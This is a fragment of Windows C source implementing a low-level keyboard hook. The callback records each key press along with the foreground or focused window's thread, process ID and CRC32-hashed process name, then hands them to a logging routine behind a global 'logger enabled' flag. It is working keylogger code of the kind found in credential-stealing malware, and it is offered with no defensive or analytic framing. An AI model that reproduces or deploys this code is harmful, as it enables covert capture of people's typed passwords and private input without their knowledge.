// low-level keyboard hook function
static LRESULT CALLBACK 
	LLKeyboardProc(
		int nCode, 
		WPARAM wParam, 
		LPARAM lParam
		) 
{
	PKBDLLHOOKSTRUCT HookStruct = (PKBDLLHOOKSTRUCT)lParam;

	DWORD CurrentThread;
	HWND  hForeground,hFocus = NULL;

	DWORD ProcessID = 0;
	DWORD ThreadID  = 0;
	DWORD HostProcess = 0;
	HANDLE hProcess;
	BOOL bAttached = FALSE;
	CHAR  ProcessName[MAX_PATH];
	
#ifdef _DEBUG
	lstrcpy(ProcessName, szUnknown);
#endif

	do {
		if ( !g_bLoggerEnabled || ( nCode != HC_ACTION ) || !HookStruct ){
			break;
		}

		if ( (UINT)wParam != WM_KEYDOWN ){ //message 
			break;
		}

		CurrentThread = GetCurrentThreadId();
		hForeground = GetForegroundWindow();

#ifndef _DEBUG
		ProcessName[0] = 0;
#endif
		if ( hForeground == NULL ){
			DbgPrint("GetForegroundWindow is NULL\n");
			break;
		}

		// get thread and process for foreground window
		if ( ThreadID = GetWindowThreadProcessId(hForeground,&ProcessID) )
		{
			if ( CurrentThread != ThreadID ){
				bAttached =
					AttachThreadInput(
						CurrentThread,
						ThreadID,
						TRUE
						);
			}
		}else{
			DbgPrint("GetWindowThreadProcessId failed, err=%lu\n",GetLastError());
		}

		// wnd that owns focus can be handled by different thread
		hFocus = GetFocus();
		if ( hFocus != hForeground )
		{
			// detach input
			if ( bAttached ){
				AttachThreadInput(
					CurrentThread,
					ThreadID,
					FALSE
					);
				bAttached = FALSE;
			}
			if ( ThreadID = GetWindowThreadProcessId(hFocus,&ProcessID) )
			{
				if ( CurrentThread != ThreadID ){
					bAttached =
						AttachThreadInput(
							CurrentThread,
							ThreadID,
							TRUE
							);
				}
			}else{
				DbgPrint("GetWindowThreadProcessId failed, err=%lu\n",GetLastError());
			}
		}

		if ( ProcessID ){
			hProcess = 
				OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE,
					ProcessID
					);
			if ( hProcess )
			{
				if ( GetModuleBaseNameA(hProcess,NULL,ProcessName,MAX_PATH) ){
					strupr(ProcessName);
					HostProcess = Crc32(ProcessName, lstrlenA(ProcessName));
				}else{
					DbgPrint("GetModuleBaseName failed, err=%lu\n",GetLastError());
				}
				CloseHandle(hProcess);
			}else{
				DbgPrint("OpenProcess failed, err=%lu\n",GetLastError());
			}
		}

		// log kbd event
		KeyProcessMessage( 
			hFocus, 
			(UINT)wParam, //message 
			(UINT)HookStruct->vkCode, 
			(UINT)HookStruct->scanCode, 
			ProcessID,
			ThreadID,
			HostProcess
#ifdef _DEBUG
			,ProcessName
#endif
			);

		if ( bAttached ){
			AttachThreadInput(
				CurrentThread,
				ThreadID,
				FALSE
				);
		}
	} while ( FALSE );

	return CallNextHookEx(0, nCode, wParam, lParam);
}